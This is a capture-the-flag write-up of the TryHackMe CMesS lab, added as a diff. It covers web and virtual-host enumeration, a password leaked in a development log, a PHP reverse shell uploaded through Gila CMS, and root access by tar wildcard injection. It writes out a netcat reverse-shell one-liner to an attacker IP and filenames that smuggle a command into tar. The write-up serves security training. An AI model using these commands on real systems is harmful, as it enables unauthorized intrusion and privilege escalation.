@@ -1,0 +1,162 @@
+TryHackMe — CMesS
+
+Platform: TryHackMe
+Difficulty: Medium
+Category: Web, CMS Enumeration, Subdomain Enumeration, Initial Access, Privilege Escalation
+Target: 10.49.141.126
+
+1. Reconnaissance
+
+I started with an Nmap scan to identify the services running on the target.
+nmap -sV -sC -Pn -T4 10.49.141.126
+The scan identified an Apache web server, so I focused the enumeration on the web application.
+
+2. Web Enumeration
+
+I used Gobuster to enumerate directories and files on the web server.
+gobuster dir -u http://10.49.141.126 -w /usr/share/wordlists/dirb/common.txt
+I then manually inspected the discovered web application using curl.
+curl -s http://10.49.141.126
+The page source revealed that the application was running Gila CMS:
+<meta name="generator" content="Gila CMS">
+The website also exposed several pages such as:
+/about
+/1/hello_world
+/author/
+I inspected the post page:
+curl -s http://10.49.141.126/1/hello_world
+The response revealed the intended hostname:
+http://cmess.thm/gila/1/hello_world/
+This indicated that cmess.thm was being used as the application's hostname.
+
+3. Gila CMS Enumeration
+
+I checked the login page:
+curl -s http://10.49.141.126/login
+The application provided an email and password login form.
+I also checked the password reset functionality:
+curl -s http://10.49.141.126/login/password_reset
+The CMS version was not directly displayed on the main website, so I searched for known Gila CMS vulnerabilities using SearchSploit.
+searchsploit "Gila CMS"
+The search returned several results, including vulnerabilities affecting Gila CMS 1.10.9.
+At this point, I continued with further enumeration instead of assuming the version.
+
+4. Subdomain Enumeration with Wfuzz
+
+Since the application was using cmess.thm, I checked for additional virtual hosts and subdomains.
+I used Wfuzz to fuzz the Host header with a SecLists DNS wordlist:
+wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.cmess.thm" http://cmess.thm/
+The important discovery was:
+dev.cmess.thm
+This suggested that a development virtual host was running on the same server.
+I added the hostname to /etc/hosts:
+10.49.141.126 dev.cmess.thm
+I then verified that the hostname resolved correctly:
+getent hosts dev.cmess.thm
+Finally, I accessed the development site:
+curl -i http://dev.cmess.thm/
+
+5. Information Disclosure
+
+The development website contained a development log with internal conversations between Andre and the support team.
+The log revealed that Andre was unable to access the admin panel and had requested a password reset.
+The support team later posted the reset password:
+KPFTN_f2yxe%
+The development page also exposed Andre's email address:
+andre@cmess.thm
+This provided valid credentials that could be used against the Gila CMS login.
+
+6. Gila CMS Version Identification
+
+Using the discovered credentials and further investigation of the application, I confirmed that the target was running:
+Gila CMS 1.10.9
+I verified the available exploits with:
+searchsploit "Gila CMS 1.10.9"
+The relevant result was:
+Gila CMS 1.10.9 - Remote Code Execution (RCE) (Authenticated)
+Since the credentials discovered through the development site provided authenticated access, this vulnerability became the path to initial access.
+
+7. Initial Access
+
+After logging into the Gila CMS administration interface, I used the available file management functionality to upload a PHP reverse shell.
+The reverse shell was configured to connect back to my TryHackMe VPN IP:
+192.168.129.177
+and port:
+4444
+I started a Netcat listener on Kali:
+nc -lvnp 4444
+I then accessed the uploaded PHP reverse shell through the web application.
+The target connected back to Kali and provided a shell on the target system.
+
+8. Shell Stabilization
+
+The initial reverse shell was not a fully interactive terminal, so I upgraded it using Python:
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+I then backgrounded the connection with Ctrl+Z and configured the terminal:
+stty raw -echo; fg
+After returning to the target shell:
+export TERM=xterm
+This provided a more usable interactive shell.
+
+9. Privilege Escalation
+
+After obtaining access as Andre, I enumerated the filesystem and found a backup directory:
+cd /home/andre/backup
+The directory contained a file named:
+note
+The backup process was vulnerable to tar wildcard injection.
+I created a script that would establish another reverse shell:
+echo 'mkfifo /tmp/lhennp; nc 192.168.129.177 4444 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp' > exploit.sh
+I then created the tar checkpoint files:
+printf '\n' > './--checkpoint=1'
+printf '\n' > './--checkpoint-action=exec=sh exploit.sh'
+The directory now contained:
+--checkpoint=1
+--checkpoint-action=exec=sh exploit.sh
+exploit.sh
+note
+When the scheduled backup process executed tar against the directory, these filenames were interpreted as tar options.
+The checkpoint action caused exploit.sh to execute.
+I started a Netcat listener on Kali:
+nc -lvnp 4444
+After the scheduled backup process executed, I received a reverse shell with elevated privileges.
+I verified the privileges with:
+whoami
+The result was:
+root
+I also confirmed the user ID:
+id
+This confirmed successful privilege escalation to root.
+
+10. Root Flag
+
+With root access, I retrieved the root flag:
+cat /root/root.txt
+The root flag was successfully Obtained
+
+New Commands and Their Uses
+
+wfuzz: Used for web fuzzing. In this machine it was used to discover virtual hosts by fuzzing the Host header
+wfuzz -c -w WORDLIST -H "Host: FUZZ.cmess.thm" http://cmess.thm/
+curl : Used to make HTTP requests and inspect web application responses.
+curl -i http://TARGET/
+getent: Used to query the system's configured name-resolution services: getent hosts dev.cmess.thm
+ss: Used to inspect listening network sockets and identify processes using ports.
+ss -lntp
+tcpdump: Used to capture and inspect network traffic. It can help troubleshoot reverse-shell connections.
+tcpdump -ni tun0 'host TARGET_IP and tcp port 4444'
+
+Lessons Learned
+
+1. Web enumeration should go beyond directory discovery. Examining page source and HTTP responses can reveal technologies, hostnames and application details.
+2. Virtual host enumeration is important. The main website did not expose the most useful information; the dev.cmess.thm virtual host contained the credentials needed for further access.
+3. Development environments should be treated as potentially sensitive. The development log exposed internal conversations and a password.
+4. Identifying the exact software version is important before selecting an exploit. SearchSploit helped correlate the Gila CMS version with known vulnerabilities.
+5. Reverse shells depend on correct network configuration. When working with TryHackMe, the VPN interface address must be used for the callback.
+6. A basic reverse shell is often inconvenient to work with. Python PTY spawning and terminal configuration can make it much more usable.
+7. Scheduled jobs are important during Linux privilege-escalation enumeration. Backup processes should be examined for unsafe command usage.
+8. Wildcards can become dangerous when their expanded filenames are interpreted as command-line options. The tar checkpoint technique demonstrated how an insecure backup process can lead to command execution.
+9. Enumeration should be systematic. Each discovery led to the next stage:
+
+Nmap → Gobuster → Gila CMS → Wfuzz → dev.cmess.thm → credential disclosure → Gila CMS 1.10.9 → initial access → reverse shell → tar wildcard privilege escalation → root.
+Overall, CMesS was a useful exercise in combining web enumeration, virtual host discovery, information disclosure, CMS vulnerability research, reverse shells and Linux privilege escalation into one complete attack chain.
